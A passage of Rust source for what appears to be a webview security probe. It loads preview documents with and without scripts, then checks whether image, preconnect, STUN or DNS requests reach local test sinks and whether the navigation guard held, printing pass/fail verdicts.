                    200,
                    "text/html; charset=utf-8",
                    parent_html.clone().into_bytes(),
                ),
                "/parent.js" => (
                    200,
                    "application/javascript; charset=utf-8",
                    parent_js.clone().into_bytes(),
                ),
                _ => (404, "text/plain; charset=utf-8", b"not found".to_vec()),
            };
            wry::http::Response::builder()
                .status(status)
                .header("Content-Type", content_type)
                .header("Content-Security-Policy", app_csp.as_str())
                .body(Cow::<'static, [u8]>::Owned(body))
                .expect("a well-formed app response")
        })
        .with_custom_protocol("writ-preview".to_string(), move |_id, request| {
            let url = request.uri().to_string();
            if request.uri().path() == format!("/{CONTROL_DOCUMENT}") {
                return wry::http::Response::builder()
                    .status(200)
                    .header("Content-Type", "text/html; charset=utf-8")
                    .body(Cow::<'static, [u8]>::Owned(
                        control_body.clone().into_bytes(),
                    ))
                    .expect("a well-formed control response");
            }
            let resolved = resolve_cached(&url, &preview_cache, &|_: &std::path::Path| false);
            let mut response = wry::http::Response::builder().status(resolved.status);
            for (key, value) in &resolved.headers {
                response = response.header(*key, value);
            }
            response
                .body(Cow::<'static, [u8]>::Owned(resolved.body.into_owned()))
                .expect("a well-formed preview response")
        })
        .with_ipc_handler(move |request| record_report(&ipc_reports, request.body()))
        .with_navigation_handler(move |url| {
            let allowed = writ_tauri_lib::navigation::is_allowed_navigation(&url, None);
            if !allowed {
                let moment = nav_moment.lock().expect("moment").clone();
                nav_refused.lock().expect("refused").push((moment, url));
            }
            allowed
        })
        .with_url("tauri://localhost/index.html");
    #[cfg(target_os = "windows")]
    let builder = {
        use wry::WebViewBuilderExtWindows;
        // wry's own defaults, which this replaces, and Chromium's private and
        // local network checks turned off (see the module doc).
        builder.with_additional_browser_args(
            "--disable-features=msWebOOUI,msPdfOOUI,msSmartScreenProtection,\
             BlockInsecurePrivateNetworkRequests,PrivateNetworkAccessSendPreflights,\
             PrivateNetworkAccessRespectPreflightResults,LocalNetworkAccessChecks \
             --autoplay-policy=no-user-gesture-required",
        )
    };

    #[cfg(not(target_os = "linux"))]
    let webview = builder.build(&window).map_err(|e| e.to_string())?;
    #[cfg(target_os = "linux")]
    let webview = {
        use tao::platform::unix::WindowExtUnix;
        use wry::WebViewBuilderExtUnix;
        let vbox = window.default_vbox().ok_or("no gtk vbox")?;
        builder.build_gtk(vbox).map_err(|e| e.to_string())?
    };

    let control_html = control_page(&sinks);
    let mut stage = Stage::AwaitOffReady {
        deadline: Instant::now() + LOAD_TIMEOUT,
    };
    let mut run_failures: Vec<String> = Vec::new();
    event_loop.run_return(|_event, _, control_flow| {
        let now = Instant::now();
        let current_load = match stage {
            Stage::AwaitLoad { load, .. } | Stage::AwaitPong { load, .. } => Some(load),
            _ => None,
        };
        let (off_ready, load_ready, load_answered, control_ran) = {
            let reports = reports.lock().expect("reports");
            (
                reports.has("off", None, Some("ready")),
                current_load.is_some_and(|load| reports.load_has(load, "load-ready")),
                current_load.is_some_and(|load| reports.load_has(load, "pong")),
                reports.has("control", Some("control-ran"), None),
            )
        };
        let set_moment = |what: String| *moment.lock().expect("moment") = what;
        let mut script = |js: &str, what: &str| {
            if let Err(e) = webview.evaluate_script(js) {
                run_failures.push(format!("could not {what}: {e}"));
            }
        };
        let next = match stage {
            Stage::AwaitOffReady { deadline } if off_ready || now >= deadline => {
                Some(Stage::OffSettle {
                    until: now + SETTLE,
                })
            }
            Stage::OffSettle { until } if now >= until => {
                set_moment("scripts on, load 0".to_string());
                script(
                    "window.__writProbe.scriptsOn(0)",
                    "load the scripts-on document",
                );
                Some(Stage::AwaitLoad {
                    load: 0,
                    deadline: now + LOAD_TIMEOUT,
                })
            }
            Stage::AwaitLoad { load, deadline } if load_ready || now >= deadline => {
                Some(Stage::Attempt {
                    load,
                    step: 0,
                    at: now,
                })
            }
            Stage::Attempt { load, step, .. } if step >= ON_LOADS[load].len() => {
                Some(Stage::LoadSettle {
                    load,
                    until: now + SETTLE,
                })
            }
            Stage::Attempt { load, step, at } if now >= at => {
                script(
                    &format!(
                        "window.__writProbe.step({})",
                        serde_json::Value::from(ON_LOADS[load][step])
                    ),
                    "send the frame its next attempt",
                );
                Some(Stage::Attempt {
                    load,
                    step: step + 1,
                    at: now + STEP_GAP,
                })
            }
            Stage::LoadSettle { load, until } if now >= until => {
                script(
                    "window.__writProbe.ping()",
                    "ask the frame whether the document is still in it",
                );
                Some(Stage::AwaitPong {
                    load,
                    deadline: now + PING_WAIT,
                })
            }
            Stage::AwaitPong { load, deadline } if load_answered || now >= deadline => {
                let next_load = load + 1;
                if next_load < ON_LOADS.len() {
                    set_moment(format!("scripts on, load {next_load}"));
                    script(
                        &format!("window.__writProbe.scriptsOn({next_load})"),
                        "load the scripts-on document again",
                    );
                    Some(Stage::AwaitLoad {
                        load: next_load,
                        deadline: now + LOAD_TIMEOUT,
                    })
                } else {
                    set_moment("the in-frame control".to_string());
                    script(
                        "window.__writProbe.control()",
                        "move the frame to the control",
                    );
                    Some(Stage::AwaitControl {
                        deadline: now + LOAD_TIMEOUT,
                    })
                }
            }
            Stage::AwaitControl { deadline } if control_ran || now >= deadline => {
                Some(Stage::ControlSettle {
                    until: now + SETTLE,
                })
            }
            Stage::ControlSettle { until } if now >= until => {
                script(
                    "window.__writProbe.report()",
                    "ask the app page where it is",
                );
                Some(Stage::Report {
                    until: now + Duration::from_secs(1),
                })
            }
            Stage::Report { until } if now >= until => {
                set_moment("the about:blank control".to_string());
                if let Err(e) = webview.load_html(&control_html) {
                    run_failures.push(format!("the control page did not load: {e}"));
                }
                Some(Stage::BlankControl {
                    until: now + SETTLE,
                })
            }
            Stage::BlankControl { until } if now >= until => {
                *control_flow = ControlFlow::Exit;
                return;
            }
            _ => None,
        };
        if let Some(next) = next {
            stage = next;
        }
        *control_flow = ControlFlow::WaitUntil(now + POLL);
    });

    let reports = reports.lock().expect("reports");
    let refused = refused.lock().expect("refused");
    evaluate(&sinks, &reports, &refused, run_failures)
}

/// How a verdict reads in the output: `ok` held as asserted, `FAIL` did not,
/// `info` is reported and not asserted.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Mark {
    Ok,
    Fail,
    Info,
}

/// One part of the run and the verdict on each thing it checked, printed as
/// one block.
struct Block {
    name: &'static str,
    about: String,
    rows: Vec<(Mark, String, String)>,
}

impl Block {
    fn new(name: &'static str, about: impl Into<String>) -> Self {
        Block {
            name,
            about: about.into(),
            rows: Vec::new(),
        }
    }

    fn row(&mut self, mark: Mark, what: impl Into<String>, verdict: impl Into<String>) {
        self.rows.push((mark, what.into(), verdict.into()));
    }
}

/// The blocks as the probe prints them, in run order, after the verdicts that
/// failed. `Ok` when none did.
fn print_blocks(blocks: &[Block]) -> Result<String, String> {
    let width = blocks
        .iter()
        .flat_map(|block| &block.rows)
        .map(|(_, what, _)| what.chars().count())
        .max()
        .unwrap_or(0);
    let mut failed = Vec::new();
    let mut lines = Vec::new();
    for block in blocks {
        lines.push(format!("{}: {}", block.name, block.about));
        for (mark, what, verdict) in &block.rows {
            let label = match mark {
                Mark::Ok => "ok",
                Mark::Fail => "FAIL",
                Mark::Info => "info",
            };
            lines.push(format!("  {label:<4}  {what:<width$}  {verdict}"));
            if *mark == Mark::Fail {
                failed.push(format!("  {}: {what}: {verdict}", block.name));
            }
        }
    }
    if failed.is_empty() {
        Ok(lines.join("\n"))
    } else {
        Err(format!(
            "failed ({}):\n{}\n{}",
            failed.len(),
            failed.join("\n"),
            lines.join("\n")
        ))
    }
}

fn shorten(url: &str) -> String {
    if url.chars().count() <= URL_SHOWN {
        url.to_string()
    } else {
        format!("{}...", url.chars().take(URL_SHOWN).collect::<String>())
    }
}

fn evaluate(
    sinks: &Sinks,
    reports: &Reports,
    refused: &[(String, String)],
    run_failures: Vec<String>,
) -> Result<String, String> {
    let reached = |vector: &str| match sinks.hits(vector) {
        0 => "did not reach its sink".to_string(),
        hits => format!("reached its sink ({hits})"),
    };
    let mut blocks = Vec::new();

    if !run_failures.is_empty() {
        let mut run = Block::new("run", "the probe could not drive the page");
        for failure in run_failures {
            run.row(Mark::Fail, "page script", failure);
        }
        blocks.push(run);
    }

    // Controls first: without them a silent sink proves nothing.
    let mut controls = Block::new(
        "controls",
        "the preview frame serving a document without the policy, then a page at about:blank",
    );
    if sinks.hits("control-frame-img") > 0 {
        controls.row(Mark::Ok, "in-frame image", reached("control-frame-img"));
    } else {
        controls.row(
            Mark::Fail,
            "in-frame image",
            "did not reach its sink, so something other than the policy keeps this engine \
             from the sinks and their silence proves nothing",
        );
    }
    controls.row(
        Mark::Info,
        "in-frame script",
        if reports.has("control", Some("control-ran"), None) {
            "ran"
        } else {
            "did not run"
        },
    );
    for (vector, what) in [
        ("control-frame-preconnect", "in-frame preconnect"),
        ("control-frame-stun", "in-frame STUN"),
        ("control-img", "about:blank image"),
        ("control-preconnect", "about:blank preconnect"),
        ("control-stun", "about:blank STUN"),
    ] {
        controls.row(Mark::Info, what, reached(vector));
    }
    blocks.push(controls);

    let off_names = match &sinks.dns {
        Some(dns) => {
            let names = dns.queried();
            let looked_up = |label: &str| names.contains(&dns.name(label));
            let mut block = Block::new(
                "dns",
                format!(
                    "{} routed to the DNS sink, which saw the probe's own lookup",
                    dns.domain
                ),
            );
            if looked_up("control-frame-img") {
                block.row(Mark::Ok, "in-frame image name", "looked up");
            } else {
                block.row(
                    Mark::Fail,
                    "in-frame image name",
                    "never reached the DNS sink, so this engine does not resolve through it \
                     and the DNS check proves nothing",
                );
            }
            block.row(
                Mark::Info,
                "about:blank image name",
                if looked_up("control-img") {
                    "looked up"
                } else {
                    "not looked up"
                },
            );
            blocks.push(block);
            let ours = format!(".{}.{}", dns.nonce, dns.domain);
            let controls = [
                dns.name("control"),
                dns.name("control-img"),
                dns.name("control-frame-img"),
            ];
            Some(
                names
                    .into_iter()
                    .filter(|name| name.ends_with(&ours) && !controls.contains(name))
                    .collect::<Vec<_>>(),
            )
        }
        None => {
            blocks.push(Block::new(
                "dns",
                "not routed on this run (set WRIT_ENGINE_PROBE_DNS_DOMAIN and _ADDR)",
            ));
            None
        }
    };

    let mut off = Block::new(
        "scripts off",
        "every document's default, one load of a document holding every static vector",
    );
    if reports.has("off", None, Some("ready")) {
        off.row(Mark::Ok, "bridge", "reported ready");
    } else {
        off.row(
            Mark::Fail,
            "bridge",
            "never reported ready, so the document did not render under the shipped policy",
        );
    }
    if reports.has("off", Some("inline-ran"), None) {
        off.row(Mark::Fail, "inline script", "ran");
    } else {
        off.row(Mark::Ok, "inline script", "did not run");
    }
    for vector in OFF_VECTORS {
        let mark = if sinks.hits(vector) > 0 {
            Mark::Fail
        } else {
            Mark::Ok
        };
        off.row(mark, *vector, reached(vector));
    }
    match off_names {
        Some(leaked) if leaked.is_empty() => {
            off.row(Mark::Ok, "names", "none reached the DNS sink");
        }
        Some(leaked) => {
            off.row(
                Mark::Fail,
                "names",
                format!("reached the DNS sink: {}", leaked.join(", ")),
            );
        }
        None => {}
    }
    blocks.push(off);

    let webview2 = cfg!(target_os = "windows");
    let mut on = Block::new(
        "scripts on",
        format!(
            "a file the user opted in, in {} loads; each attempt that can move the frame has a \
             load of its own",
            ON_LOADS.len()
        ),
    );
    for (load, vectors) in ON_LOADS.iter().enumerate() {
        let what = format!("load {load}");
        if reports.load_has(load, "load-ready") {
            let after = if reports.load_has(load, "pong") {
                "the document answered the ping after its attempts"
            } else {
                "the frame had left the document by the ping after its attempts"
            };
            on.row(Mark::Ok, what, format!("reported in; {after}"));
        } else if reports.load_has(load, "inline-ran") {
            on.row(
                Mark::Fail,
                what,
                "its script ran, but the document never reported in",
            );
        } else {
            on.row(Mark::Fail, what, "never reported in: its script never ran");
        }
        for vector in vectors.iter().copied() {
            let accepted = if vector == "stun" || ON_RESIDUAL.contains(&vector) {
                Some("accepted for an opted-in file")
            } else if webview2 && ON_FRAME_NAVIGATIONS.contains(&vector) {
                Some("accepted for an opted-in file on WebView2")
            } else {
                None
            };
            let mut failed = false;
            let mut verdict = Vec::new();
            if reports.attempt(vector).is_some() {
                verdict.push("attempted".to_string());
            } else {
                failed = true;
                verdict.push("never attempted".to_string());
            }
            verdict.push(reached(vector));
            match accepted {
                Some(why) => verdict.push(why.to_string()),
                None => failed |= sinks.hits(vector) > 0,
            }
            if ON_CLICKS.contains(&vector) {
                if reports.opened(&sinks.url(vector)) {
                    verdict.push("reached the app as a request to open".to_string());
                } else {
                    failed = true;
                    verdict.push("never reached the app as a request to open".to_string());
                }
            }
            let mark = if failed {
                Mark::Fail
            } else if accepted.is_some() {
                Mark::Info
            } else {
                Mark::Ok
            };
            on.row(mark, vector, verdict.join("; "));
        }
    }
    for vector in reports.unknown_steps() {
        on.row(
            Mark::Fail,
            vector,
            "the scripts-on document has no attempt by that name",
        );
    }
    blocks.push(on);

    // The app page stayed where it was through every phase.
    let mut app = Block::new("app page", "the top-level page and the navigation guard");
    match &reports.final_href {
        Some(href) if writ_tauri_lib::navigation::is_allowed_navigation(href, None) => {
            app.row(
                Mark::Ok,
                "location",
                format!("still {href} after every phase"),
            );
        }
        Some(href) => app.row(Mark::Fail, "location", format!("navigated away, to {href}")),
        None => app.row(
            Mark::Fail,
            "location",
            "did not answer at the end of the run",
        ),
    }
    if refused.is_empty() {
        app.row(Mark::Info, "guard", "refused nothing");
    }
    for (moment, url) in refused {
        app.row(
            Mark::Info,
            "guard",
            format!("refused {} during {moment}", shorten(url)),
        );
    }
    blocks.push(app);

    print_blocks(&blocks)
}
